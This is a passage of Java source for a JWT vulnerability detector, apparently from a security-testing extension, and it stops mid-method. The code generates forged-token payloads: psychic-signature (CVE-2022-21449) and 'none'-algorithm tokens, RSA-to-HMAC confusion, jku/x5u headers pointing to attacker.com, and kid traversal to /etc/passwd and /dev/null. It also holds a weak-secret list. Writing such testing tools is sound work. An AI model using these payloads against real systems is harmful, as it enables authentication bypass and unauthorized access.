import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.nio.charset.StandardCharsets;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.security.*;
import java.security.spec.*;
import java.math.BigInteger;
import java.time.Instant;
import java.security.interfaces.ECPublicKey;
import java.security.interfaces.RSAPublicKey;

/**
 * Advanced CVE and algorithm confusion attack detector
 * Implements comprehensive vulnerability detection based on professional JWT security tools
 */
public class AdvancedVulnerabilityDetector {
    private static final JWTExtensionLogger logger = JWTExtensionLogger.getLogger(AdvancedVulnerabilityDetector.class);
    
    // CVE-2022-21449 detection patterns
    private static final Pattern ECDSA_ALGORITHM_PATTERN = Pattern.compile("^ES(256|384|512)$");
    private static final Set<String> PSYCHIC_SIGNATURE_ALGORITHMS = Collections.unmodifiableSet(
        new HashSet<>(Arrays.asList("ES256", "ES384", "ES512"))
    );
    
    // Algorithm confusion patterns
    private static final Map<String, Set<String>> ALGORITHM_FAMILIES = Collections.unmodifiableMap(
        new HashMap<String, Set<String>>() {{
            put("HMAC", new HashSet<>(Arrays.asList("HS256", "HS384", "HS512")));
            put("RSA", new HashSet<>(Arrays.asList("RS256", "RS384", "RS512", "PS256", "PS384", "PS512")));
            put("ECDSA", new HashSet<>(Arrays.asList("ES256", "ES384", "ES512")));
            put("NONE", new HashSet<>(Arrays.asList("none", "None", "NONE", "NoNe", "nOnE", "NoNE", "nOnE")));
        }}
    );
    
    // Weak signature patterns
    private static final Pattern WEAK_SECRET_PATTERN = Pattern.compile("^(secret|password|123|test|key|jwt)$", Pattern.CASE_INSENSITIVE);
    private static final List<String> COMMON_WEAK_SECRETS = Collections.unmodifiableList(Arrays.asList(
        "", "secret", "password", "123456", "jwt", "key", "test", "admin", "user", "guest",
        "qwerty", "abc123", "password123", "secret123", "jwt-secret", "my-secret", "shared-secret"
    ));
    
    // RSA key confusion attack payloads
    private static final String RSA_CONFUSION_PUBLIC_KEY = 
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuGbXWiK3dQTyCbX5xdE4" +
        "yCuYp9VoiQtyGFuZPiS2XGFiGIvzf7kIB3dQUeAmY/J6W4C+iL9P1k2s2QjHaY" +
        "K5Q4fP8D6J7R8rYx4YHzKiY8g4H8d8IhKyQ8k9p8lSj3xaQxG9QfI6q8DlvT";
    
    // ECDSA vulnerability signatures (CVE-2022-21449)
    private static final byte[] INVALID_ECDSA_SIGNATURE_P256 = new byte[]{
        0x30, 0x06, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00
    };
    
    private static final byte[] INVALID_ECDSA_SIGNATURE_P384 = new byte[]{
        0x30, 0x0a, 0x02, 0x01, 0x00, 0x02, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    /**
     * Comprehensive vulnerability assessment result
     */
    public static class VulnerabilityAssessment {
        private final List<SecurityFinding> criticalVulnerabilities;
        private final List<SecurityFinding> algorithmWeaknesses;
        private final List<SecurityFinding> configurationIssues;
        private final Map<String, AttackVector> possibleAttacks;
        private final RiskScore riskScore;
        private final String assessmentId;
        private final long timestamp;
        
        public VulnerabilityAssessment(List<SecurityFinding> critical, List<SecurityFinding> algorithmic,
                                     List<SecurityFinding> configuration, Map<String, AttackVector> attacks,
                                     RiskScore score) {
            this.criticalVulnerabilities = Collections.unmodifiableList(new ArrayList<>(critical));
            this.algorithmWeaknesses = Collections.unmodifiableList(new ArrayList<>(algorithmic));
            this.configurationIssues = Collections.unmodifiableList(new ArrayList<>(configuration));
            this.possibleAttacks = Collections.unmodifiableMap(new LinkedHashMap<>(attacks));
            this.riskScore = score;
            this.assessmentId = UUID.randomUUID().toString();
            this.timestamp = System.currentTimeMillis();
        }
        
        public List<SecurityFinding> getCriticalVulnerabilities() { return criticalVulnerabilities; }
        public List<SecurityFinding> getAlgorithmWeaknesses() { return algorithmWeaknesses; }
        public List<SecurityFinding> getConfigurationIssues() { return configurationIssues; }
        public Map<String, AttackVector> getPossibleAttacks() { return possibleAttacks; }
        public RiskScore getRiskScore() { return riskScore; }
        public String getAssessmentId() { return assessmentId; }
        public long getTimestamp() { return timestamp; }
        
        public boolean hasHighRiskVulnerabilities() {
            return riskScore.getOverallScore() >= 7.0;
        }
        
        public boolean isCriticallyVulnerable() {
            return !criticalVulnerabilities.isEmpty();
        }
        
        public String generateSummaryReport() {
            StringBuilder report = new StringBuilder();
            report.append("JWT Vulnerability Assessment Report\n");
            report.append("================================\n\n");
            report.append("Assessment ID: ").append(assessmentId).append("\n");
            report.append("Risk Level: ").append(riskScore.getRiskLevel()).append("\n");
            report.append("Overall Score: ").append(String.format("%.1f", riskScore.getOverallScore())).append("/10\n\n");
            
            report.append("Summary:\n");
            report.append("- Critical Vulnerabilities: ").append(criticalVulnerabilities.size()).append("\n");
            report.append("- Algorithm Weaknesses: ").append(algorithmWeaknesses.size()).append("\n");
            report.append("- Configuration Issues: ").append(configurationIssues.size()).append("\n");
            report.append("- Attack Vectors: ").append(possibleAttacks.size()).append("\n\n");
            
            if (!criticalVulnerabilities.isEmpty()) {
                report.append("CRITICAL VULNERABILITIES:\n");
                for (SecurityFinding finding : criticalVulnerabilities) {
                    report.append("- ").append(finding.getTitle()).append(": ").append(finding.getDescription()).append("\n");
                }
                report.append("\n");
            }
            
            return report.toString();
        }
    }
    
    /**
     * Attack vector description with exploitation details
     */
    public static class AttackVector {
        private final String name;
        private final String description;
        private final String exploitMethod;
        private final String payload;
        private final double successProbability;
        private final String impact;
        private final String mitigation;
        
        public AttackVector(String name, String description, String exploitMethod, String payload,
                          double successProbability, String impact, String mitigation) {
            this.name = name;
            this.description = description;
            this.exploitMethod = exploitMethod;
            this.payload = payload;
            this.successProbability = successProbability;
            this.impact = impact;
            this.mitigation = mitigation;
        }
        
        public String getName() { return name; }
        public String getDescription() { return description; }
        public String getExploitMethod() { return exploitMethod; }
        public String getPayload() { return payload; }
        public double getSuccessProbability() { return successProbability; }
        public String getImpact() { return impact; }
        public String getMitigation() { return mitigation; }
        
        public String formatForDisplay() {
            StringBuilder formatted = new StringBuilder();
            formatted.append("Attack: ").append(name).append("\n");
            formatted.append("Success Rate: ").append(String.format("%.0f%%", successProbability * 100)).append("\n");
            formatted.append("Impact: ").append(impact).append("\n");
            formatted.append("Method: ").append(exploitMethod).append("\n");
            formatted.append("Payload: ").append(payload.length() > 100 ? 
                payload.substring(0, 100) + "..." : payload).append("\n");
            formatted.append("Mitigation: ").append(mitigation).append("\n");
            return formatted.toString();
        }
    }
    
    /**
     * Risk scoring based on multiple vulnerability factors
     */
    public static class RiskScore {
        private final double algorithmRisk;
        private final double configurationRisk;
        private final double implementationRisk;
        private final double overallScore;
        private final String riskLevel;
        
        public RiskScore(double algorithm, double configuration, double implementation) {
            this.algorithmRisk = algorithm;
            this.configurationRisk = configuration;
            this.implementationRisk = implementation;
            this.overallScore = (algorithm * 0.4 + configuration * 0.3 + implementation * 0.3);
            
            if (overallScore >= 8.0) {
                this.riskLevel = "CRITICAL";
            } else if (overallScore >= 6.0) {
                this.riskLevel = "HIGH";
            } else if (overallScore >= 4.0) {
                this.riskLevel = "MEDIUM";
            } else if (overallScore >= 2.0) {
                this.riskLevel = "LOW";
            } else {
                this.riskLevel = "MINIMAL";
            }
        }
        
        public double getAlgorithmRisk() { return algorithmRisk; }
        public double getConfigurationRisk() { return configurationRisk; }
        public double getImplementationRisk() { return implementationRisk; }
        public double getOverallScore() { return overallScore; }
        public String getRiskLevel() { return riskLevel; }
    }
    
    /**
     * Perform comprehensive vulnerability assessment
     */
    public static VulnerabilityAssessment assessVulnerabilities(AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        String resourceId = "VulnDetector-" + parsedJWT.getParseId();
        
        try {
            logger.debug("Starting comprehensive vulnerability assessment");
            
            List<SecurityFinding> criticalVulns = new ArrayList<>();
            List<SecurityFinding> algorithmWeaknesses = new ArrayList<>();
            List<SecurityFinding> configIssues = new ArrayList<>();
            Map<String, AttackVector> attackVectors = new LinkedHashMap<>();
            
            // CVE-2022-21449 assessment
            assessCVE202221449(parsedJWT, criticalVulns, attackVectors);
            
            // Algorithm confusion vulnerabilities
            assessAlgorithmConfusion(parsedJWT, algorithmWeaknesses, attackVectors);
            
            // Signature bypass vulnerabilities
            assessSignatureBypass(parsedJWT, criticalVulns, attackVectors);
            
            // Weak secret vulnerabilities
            assessWeakSecrets(parsedJWT, algorithmWeaknesses, attackVectors);
            
            // Header injection vulnerabilities
            assessHeaderInjections(parsedJWT, criticalVulns, attackVectors);
            
            // Path traversal vulnerabilities
            assessPathTraversal(parsedJWT, criticalVulns, attackVectors);
            
            // Configuration weaknesses
            assessConfiguration(parsedJWT, configIssues);
            
            // Calculate risk score
            RiskScore riskScore = calculateRiskScore(criticalVulns, algorithmWeaknesses, configIssues);
            
            VulnerabilityAssessment assessment = new VulnerabilityAssessment(
                criticalVulns, algorithmWeaknesses, configIssues, attackVectors, riskScore);
            
            logger.info("Vulnerability assessment completed: %s risk level with %d critical vulnerabilities",
                riskScore.getRiskLevel(), criticalVulns.size());
            
            return assessment;
            
        } catch (Exception e) {
            logger.error("Vulnerability assessment failed: %s", e.getMessage());
            throw new RuntimeException("Vulnerability assessment failed", e);
        }
    }
    
    /**
     * Assess CVE-2022-21449 vulnerability (Psychic Signatures)
     */
    private static void assessCVE202221449(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                         List<SecurityFinding> criticalVulns,
                                         Map<String, AttackVector> attackVectors) {
        
        String algorithm = parsedJWT.getAlgorithm();
        
        if (algorithm != null && PSYCHIC_SIGNATURE_ALGORITHMS.contains(algorithm)) {
            // Create detailed vulnerability finding
            SecurityFinding cveVuln = new SecurityFinding("CVE-2022-21449", "critical",
                "ECDSA algorithm vulnerable to Psychic Signatures attack (CVE-2022-21449). " +
                "Affects Java 15-18. Attackers can forge valid signatures using invalid ECDSA signatures.",
                "Algorithm: " + algorithm + ", Signature: " + parsedJWT.getComponents().getEncodedSignature());
            
            criticalVulns.add(cveVuln);
            
            // Create attack vector
            String payload = generatePsychicSignaturePayload(algorithm, parsedJWT);
            AttackVector psychicAttack = new AttackVector(
                "Psychic Signatures (CVE-2022-21449)",
                "Exploit ECDSA signature verification vulnerability in Java 15-18",
                "Send JWT with invalid ECDSA signature (r=0, s=0) to bypass verification",
                payload,
                0.95, // High success probability on vulnerable systems
                "Complete authentication bypass, privilege escalation, unauthorized access",
                "Update Java to 15.0.7+, 17.0.3+, 18.0.1+ or implement strict signature validation"
            );
            
            attackVectors.put("CVE-2022-21449", psychicAttack);
            
            logger.warn("CVE-2022-21449 vulnerability detected in algorithm: %s", algorithm);
        }
    }
    
    /**
     * Generate Psychic Signature attack payload
     */
    private static String generatePsychicSignaturePayload(String algorithm, AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        try {
            // Get original components
            AdvancedJWTParser.JWTComponents components = parsedJWT.getComponents();
            
            // Generate invalid ECDSA signature based on algorithm
            byte[] invalidSignature;
            switch (algorithm) {
                case "ES256":
                    invalidSignature = INVALID_ECDSA_SIGNATURE_P256;
                    break;
                case "ES384":
                    invalidSignature = INVALID_ECDSA_SIGNATURE_P384;
                    break;
                case "ES512":
                    invalidSignature = new byte[]{0x30, 0x06, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00};
                    break;
                default:
                    invalidSignature = INVALID_ECDSA_SIGNATURE_P256;
            }
            
            // Encode invalid signature as Base64URL
            String encodedInvalidSignature = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(invalidSignature);
            
            // Reconstruct JWT with invalid signature
            return components.getEncodedHeader() + "." + 
                   components.getEncodedPayload() + "." + 
                   encodedInvalidSignature;
                   
        } catch (Exception e) {
            logger.error("Failed to generate psychic signature payload: %s", e.getMessage());
            return "ERROR_GENERATING_PAYLOAD";
        }
    }
    
    /**
     * Assess algorithm confusion vulnerabilities
     */
    private static void assessAlgorithmConfusion(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                               List<SecurityFinding> algorithmWeaknesses,
                                               Map<String, AttackVector> attackVectors) {
        
        String algorithm = parsedJWT.getAlgorithm();
        if (algorithm == null) return;
        
        // None algorithm variants
        if (ALGORITHM_FAMILIES.get("NONE").contains(algorithm)) {
            SecurityFinding noneFinding = new SecurityFinding("Algorithm Confusion", "critical",
                "None algorithm variant detected. Token can be accepted without signature verification.",
                "Algorithm: " + algorithm);
            algorithmWeaknesses.add(noneFinding);
            
            // Generate none algorithm attack
            String nonePayload = generateNoneAlgorithmPayload(parsedJWT);
            AttackVector noneAttack = new AttackVector(
                "None Algorithm Bypass",
                "Remove signature verification by setting algorithm to 'none'",
                "Modify JWT header to use 'none' algorithm and remove signature",
                nonePayload,
                0.85,
                "Complete authentication bypass, unauthorized access",
                "Reject tokens with 'none' algorithm, implement strict algorithm whitelist"
            );
            attackVectors.put("none-algorithm", noneAttack);
        }
        
        // RSA to HMAC confusion
        if (ALGORITHM_FAMILIES.get("RSA").contains(algorithm)) {
            SecurityFinding rsaHmacFinding = new SecurityFinding("Algorithm Confusion", "high",
                "RSA algorithm used. Vulnerable to RSA-to-HMAC confusion if public key is accessible.",
                "Algorithm: " + algorithm);
            algorithmWeaknesses.add(rsaHmacFinding);
            
            // Generate RSA-to-HMAC attack payloads
            generateRSAtoHMACAttacks(parsedJWT, attackVectors);
        }
        
        // HMAC algorithm weakness
        if (ALGORITHM_FAMILIES.get("HMAC").contains(algorithm)) {
            SecurityFinding hmacFinding = new SecurityFinding("Algorithm Weakness", "medium",
                "HMAC algorithm used. Vulnerable to key confusion and brute force attacks.",
                "Algorithm: " + algorithm);
            algorithmWeaknesses.add(hmacFinding);
            
            // Generate HMAC brute force attack
            generateHMACBruteForceAttack(parsedJWT, attackVectors);
        }
    }
    
    /**
     * Generate none algorithm attack payload
     */
    private static String generateNoneAlgorithmPayload(AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        try {
            // Modify header to use 'none' algorithm
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(parsedJWT.getHeader());
            modifiedHeader.put("alg", "none");
            
            // Serialize header to JSON
            String headerJson = serializeToJson(modifiedHeader);
            String encodedHeader = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
            
            // Return JWT with none algorithm and no signature
            return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + ".";
            
        } catch (Exception e) {
            logger.error("Failed to generate none algorithm payload: %s", e.getMessage());
            return "ERROR_GENERATING_NONE_PAYLOAD";
        }
    }
    
    /**
     * Generate RSA-to-HMAC confusion attacks
     */
    private static void generateRSAtoHMACAttacks(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                               Map<String, AttackVector> attackVectors) {
        
        String originalAlg = parsedJWT.getAlgorithm();
        String hmacAlg = getCorrespondingHMACAlgorithm(originalAlg);
        
        if (hmacAlg != null) {
            // Generate attack using RSA public key as HMAC secret
            String confusionPayload = generateAlgorithmConfusionPayload(parsedJWT, hmacAlg);
            
            AttackVector confusionAttack = new AttackVector(
                "RSA-to-HMAC Algorithm Confusion",
                "Use RSA public key as HMAC secret to forge signatures",
                "1. Extract RSA public key from certificate/JWK\n2. Convert to raw bytes\n3. Use as HMAC secret\n4. Sign JWT with HMAC algorithm",
                confusionPayload,
                0.70,
                "Complete authentication bypass, privilege escalation",
                "Implement strict algorithm validation, separate key stores for different algorithms"
            );
            
            attackVectors.put("rsa-hmac-confusion", confusionAttack);
        }
    }
    
    /**
     * Generate HMAC brute force attack
     */
    private static void generateHMACBruteForceAttack(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                                   Map<String, AttackVector> attackVectors) {
        
        AttackVector bruteForceAttack = new AttackVector(
            "HMAC Secret Brute Force",
            "Attempt to discover weak HMAC signing secrets",
            "1. Extract JWT header and payload\n2. Test common weak secrets\n3. Verify signature matches",
            generateWeakSecretTestPayload(parsedJWT),
            0.30, // Lower probability but still significant
            "Discovery of signing secret, token forgery capability",
            "Use strong, random secrets (256+ bits), implement rate limiting"
        );
        
        attackVectors.put("hmac-brute-force", bruteForceAttack);
    }
    
    /**
     * Assess signature bypass vulnerabilities
     */
    private static void assessSignatureBypass(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                            List<SecurityFinding> criticalVulns,
                                            Map<String, AttackVector> attackVectors) {
        
        String signature = parsedJWT.getComponents().getEncodedSignature();
        
        // Empty signature detection
        if (signature.isEmpty()) {
            SecurityFinding emptySignature = new SecurityFinding("Signature Bypass", "critical",
                "Empty signature detected. Server may accept unsigned tokens.");
            criticalVulns.add(emptySignature);
            
            AttackVector bypassAttack = new AttackVector(
                "Empty Signature Bypass",
                "Remove signature to test if server validates signature presence",
                "Send JWT with empty signature component",
                parsedJWT.getComponents().getEncodedHeader() + "." + 
                parsedJWT.getComponents().getEncodedPayload() + ".",
                0.60,
                "Authentication bypass, unauthorized access",
                "Implement mandatory signature validation"
            );
            
            attackVectors.put("empty-signature", bypassAttack);
        }
        
        // Suspicious signature length
        if (signature.length() < 10 && !signature.isEmpty()) {
            SecurityFinding shortSignature = new SecurityFinding("Signature Bypass", "high",
                "Unusually short signature detected. May indicate weak or manipulated signature.",
                "Signature length: " + signature.length());
            criticalVulns.add(shortSignature);
        }
    }
    
    /**
     * Assess weak secret vulnerabilities
     */
    private static void assessWeakSecrets(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                        List<SecurityFinding> algorithmWeaknesses,
                                        Map<String, AttackVector> attackVectors) {
        
        String algorithm = parsedJWT.getAlgorithm();
        
        if (algorithm != null && ALGORITHM_FAMILIES.get("HMAC").contains(algorithm)) {
            // Test for common weak secrets
            boolean weakSecretFound = testWeakSecrets(parsedJWT);
            
            if (weakSecretFound) {
                SecurityFinding weakSecret = new SecurityFinding("Weak Secret", "critical",
                    "JWT signed with common weak secret. Token can be forged easily.");
                algorithmWeaknesses.add(weakSecret);
                
                AttackVector weakSecretAttack = new AttackVector(
                    "Weak Secret Exploitation",
                    "JWT signed with predictable or common secret",
                    "Use discovered weak secret to forge arbitrary JWTs",
                    "Secret discovered through brute force attack",
                    0.95,
                    "Complete token forgery capability, authentication bypass",
                    "Use cryptographically strong, random secrets (256+ bits)"
                );
                
                attackVectors.put("weak-secret", weakSecretAttack);
            }
        }
    }
    
    /**
     * Test for weak secrets using common patterns
     */
    private static boolean testWeakSecrets(AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        try {
            String algorithm = parsedJWT.getAlgorithm();
            AdvancedJWTParser.JWTComponents components = parsedJWT.getComponents();
            String signingInput = components.getEncodedHeader() + "." + components.getEncodedPayload();
            byte[] expectedSignature = Base64.getUrlDecoder().decode(
                addPadding(components.getEncodedSignature()));
            
            // Test common weak secrets
            for (String weakSecret : COMMON_WEAK_SECRETS) {
                try {
                    Mac mac = Mac.getInstance(getHMACAlgorithmName(algorithm));
                    SecretKeySpec secretKey = new SecretKeySpec(
                        weakSecret.getBytes(StandardCharsets.UTF_8), mac.getAlgorithm());
                    mac.init(secretKey);
                    
                    byte[] signature = mac.doFinal(signingInput.getBytes(StandardCharsets.UTF_8));
                    
                    if (Arrays.equals(signature, expectedSignature)) {
                        logger.warn("Weak secret detected: %s", weakSecret);
                        return true;
                    }
                } catch (Exception e) {
                    // Continue testing other secrets
                }
            }
            
            return false;
            
        } catch (Exception e) {
            logger.error("Error testing weak secrets: %s", e.getMessage());
            return false;
        }
    }
    
    /**
     * Assess header injection vulnerabilities
     */
    private static void assessHeaderInjections(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                             List<SecurityFinding> criticalVulns,
                                             Map<String, AttackVector> attackVectors) {
        
        Map<String, Object> header = parsedJWT.getHeader();
        
        // JWK injection
        if (header.containsKey("jwk")) {
            SecurityFinding jwkInjection = new SecurityFinding("Header Injection", "critical",
                "JWK header injection detected. Attacker can embed malicious public key.",
                "JWK present in header");
            criticalVulns.add(jwkInjection);
            
            AttackVector jwkAttack = new AttackVector(
                "JWK Header Injection",
                "Embed attacker-controlled public key in JWT header",
                "1. Generate attacker key pair\n2. Embed public key in jwk header\n3. Sign JWT with attacker private key",
                generateJWKInjectionPayload(parsedJWT),
                0.90,
                "Complete authentication bypass, arbitrary token creation",
                "Reject JWTs with jwk header, use pre-configured trusted keys only"
            );
            
            attackVectors.put("jwk-injection", jwkAttack);
        }
        
        // JKU injection
        if (header.containsKey("jku")) {
            String jku = header.get("jku").toString();
            SecurityFinding jkuInjection = new SecurityFinding("Header Injection", "high",
                "JKU header detected. Server may fetch keys from attacker URL.",
                "JKU: " + jku);
            criticalVulns.add(jkuInjection);
            
            AttackVector jkuAttack = new AttackVector(
                "JKU Header Injection",
                "Point server to attacker-controlled JWK Set URL",
                "1. Host malicious JWK Set on attacker server\n2. Set jku header to attacker URL\n3. Sign JWT with attacker key",
                generateJKUInjectionPayload(parsedJWT, jku),
                0.75,
                "Authentication bypass, SSRF, information disclosure",
                "Implement JKU URL whitelist, validate JWK Set sources"
            );
            
            attackVectors.put("jku-injection", jkuAttack);
        }
        
        // X5U injection
        if (header.containsKey("x5u")) {
            String x5u = header.get("x5u").toString();
            SecurityFinding x5uInjection = new SecurityFinding("Header Injection", "high",
                "X5U header detected. Server may fetch certificate from attacker URL.",
                "X5U: " + x5u);
            criticalVulns.add(x5uInjection);
            
            AttackVector x5uAttack = new AttackVector(
                "X5U Header Injection",
                "Point server to attacker-controlled certificate URL",
                "1. Host malicious certificate on attacker server\n2. Set x5u header to attacker URL\n3. Sign JWT with corresponding private key",
                generateX5UInjectionPayload(parsedJWT, x5u),
                0.70,
                "Authentication bypass, SSRF, certificate chain attacks",
                "Implement X5U URL whitelist, validate certificate sources"
            );
            
            attackVectors.put("x5u-injection", x5uAttack);
        }
    }
    
    /**
     * Assess path traversal vulnerabilities
     */
    private static void assessPathTraversal(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                          List<SecurityFinding> criticalVulns,
                                          Map<String, AttackVector> attackVectors) {
        
        Map<String, Object> header = parsedJWT.getHeader();
        
        if (header.containsKey("kid")) {
            String kid = header.get("kid").toString();
            
            // Path traversal patterns
            if (kid.contains("../") || kid.contains("..\\")) {
                SecurityFinding pathTraversal = new SecurityFinding("Path Traversal", "high",
                    "KID path traversal detected. May allow reading arbitrary files.",
                    "KID: " + kid);
                criticalVulns.add(pathTraversal);
                
                AttackVector traversalAttack = new AttackVector(
                    "KID Path Traversal",
                    "Use directory traversal in kid parameter to access files",
                    "1. Set kid to path traversal payload\n2. Point to predictable file (e.g., /dev/null)\n3. Sign with empty/null key",
                    generatePathTraversalPayload(parsedJWT),
                    0.50,
                    "File disclosure, key confusion, authentication bypass",
                    "Validate kid parameter, use whitelist of allowed key IDs"
                );
                
                attackVectors.put("path-traversal", traversalAttack);
            }
            
            // Null file exploitation
            if (kid.contains("/dev/null") || kid.contains("\\dev\\null")) {
                SecurityFinding nullFile = new SecurityFinding("Null File Exploitation", "critical",
                    "KID points to null device. Token may be signed with empty key.",
                    "KID: " + kid);
                criticalVulns.add(nullFile);
                
                AttackVector nullAttack = new AttackVector(
                    "Null File Key Confusion",
                    "Exploit kid parameter pointing to /dev/null",
                    "1. Set kid to /dev/null path\n2. Sign JWT with empty key/password\n3. Server reads empty file as key",
                    generateNullFilePayload(parsedJWT),
                    0.80,
                    "Authentication bypass using empty key",
                    "Validate kid parameter against whitelist, reject path characters"
                );
                
                attackVectors.put("null-file", nullAttack);
            }
        }
    }
    
    /**
     * Assess configuration weaknesses
     */
    private static void assessConfiguration(AdvancedJWTParser.ParsedJWTResult parsedJWT,
                                          List<SecurityFinding> configIssues) {
        
        Map<String, Object> payload = parsedJWT.getPayload();
        
        // Missing expiration
        if (!payload.containsKey("exp")) {
            configIssues.add(new SecurityFinding("Configuration", "medium",
                "Missing expiration claim. Token never expires."));
        }
        
        // Missing issuer
        if (!payload.containsKey("iss")) {
            configIssues.add(new SecurityFinding("Configuration", "low",
                "Missing issuer claim. Reduces token traceability."));
        }
        
        // Missing audience
        if (!payload.containsKey("aud")) {
            configIssues.add(new SecurityFinding("Configuration", "medium",
                "Missing audience claim. Increases replay attack risk."));
        }
        
        // Missing JWT ID
        if (!payload.containsKey("jti")) {
            configIssues.add(new SecurityFinding("Configuration", "medium",
                "Missing JWT ID claim. Token replay prevention not possible."));
        }
        
        // Token expiration analysis
        if (parsedJWT.isExpired()) {
            configIssues.add(new SecurityFinding("Configuration", "info",
                "Token has expired. Should be rejected by server."));
        }
    }
    
    /**
     * Calculate comprehensive risk score
     */
    private static RiskScore calculateRiskScore(List<SecurityFinding> critical,
                                              List<SecurityFinding> algorithmic,
                                              List<SecurityFinding> configuration) {
        
        double algorithmRisk = 0.0;
        double configRisk = 0.0;
        double implementationRisk = 0.0;
        
        // Critical vulnerabilities contribute heavily to all risk categories
        for (SecurityFinding finding : critical) {
            implementationRisk += 3.0;
            if (finding.getTitle().toLowerCase().contains("algorithm")) {
                algorithmRisk += 2.5;
            }
        }
        
        // Algorithm weaknesses
        for (SecurityFinding finding : algorithmic) {
            algorithmRisk += 2.0;
            implementationRisk += 1.0;
        }
        
        // Configuration issues
        for (SecurityFinding finding : configuration) {
            configRisk += 1.5;
        }
        
        // Normalize to 0-10 scale
        algorithmRisk = Math.min(10.0, algorithmRisk);
        configRisk = Math.min(10.0, configRisk);
        implementationRisk = Math.min(10.0, implementationRisk);
        
        return new RiskScore(algorithmRisk, configRisk, implementationRisk);
    }
    
    // Payload generation methods
    
    private static String generateAlgorithmConfusionPayload(AdvancedJWTParser.ParsedJWTResult parsedJWT, String newAlg) {
        try {
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(parsedJWT.getHeader());
            modifiedHeader.put("alg", newAlg);
            
            String headerJson = serializeToJson(modifiedHeader);
            String encodedHeader = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
            
            return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + ".SIGNATURE_TO_BE_COMPUTED";
            
        } catch (Exception e) {
            return "ERROR_GENERATING_CONFUSION_PAYLOAD";
        }
    }
    
    private static String generateWeakSecretTestPayload(AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        return "Test with common secrets: " + String.join(", ", COMMON_WEAK_SECRETS.subList(0, 5)) + "...";
    }
    
    private static String generateJWKInjectionPayload(AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        try {
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(parsedJWT.getHeader());
            
            // Add malicious JWK
            Map<String, Object> maliciousJWK = new LinkedHashMap<>();
            maliciousJWK.put("kty", "RSA");
            maliciousJWK.put("n", "ATTACKER_CONTROLLED_MODULUS");
            maliciousJWK.put("e", "AQAB");
            
            modifiedHeader.put("jwk", maliciousJWK);
            
            String headerJson = serializeToJson(modifiedHeader);
            String encodedHeader = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
            
            return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + ".ATTACKER_SIGNATURE";
            
        } catch (Exception e) {
            return "ERROR_GENERATING_JWK_PAYLOAD";
        }
    }
    
    private static String generateJKUInjectionPayload(AdvancedJWTParser.ParsedJWTResult parsedJWT, String originalJKU) {
        try {
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(parsedJWT.getHeader());
            modifiedHeader.put("jku", "https://attacker.com/jwks.json");
            
            String headerJson = serializeToJson(modifiedHeader);
            String encodedHeader = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
            
            return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + ".ATTACKER_SIGNATURE";
            
        } catch (Exception e) {
            return "ERROR_GENERATING_JKU_PAYLOAD";
        }
    }
    
    private static String generateX5UInjectionPayload(AdvancedJWTParser.ParsedJWTResult parsedJWT, String originalX5U) {
        try {
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(parsedJWT.getHeader());
            modifiedHeader.put("x5u", "https://attacker.com/cert.pem");
            
            String headerJson = serializeToJson(modifiedHeader);
            String encodedHeader = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
            
            return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + ".ATTACKER_SIGNATURE";
            
        } catch (Exception e) {
            return "ERROR_GENERATING_X5U_PAYLOAD";
        }
    }
    
    private static String generatePathTraversalPayload(AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        try {
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(parsedJWT.getHeader());
            modifiedHeader.put("kid", "../../../../../../../etc/passwd");
            
            String headerJson = serializeToJson(modifiedHeader);
            String encodedHeader = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
            
            return encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload() + ".TRAVERSAL_SIGNATURE";
            
        } catch (Exception e) {
            return "ERROR_GENERATING_TRAVERSAL_PAYLOAD";
        }
    }
    
    private static String generateNullFilePayload(AdvancedJWTParser.ParsedJWTResult parsedJWT) {
        try {
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(parsedJWT.getHeader());
            modifiedHeader.put("kid", "../../../../../../../dev/null");
            modifiedHeader.put("alg", "HS256");
            
            String headerJson = serializeToJson(modifiedHeader);
            String encodedHeader = Base64.getUrlEncoder()
                .withoutPadding()
                .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
            
            // Sign with empty key (simulating /dev/null content)
            String signingInput = encodedHeader + "." + parsedJWT.getComponents().getEncodedPayload();
            
            try {
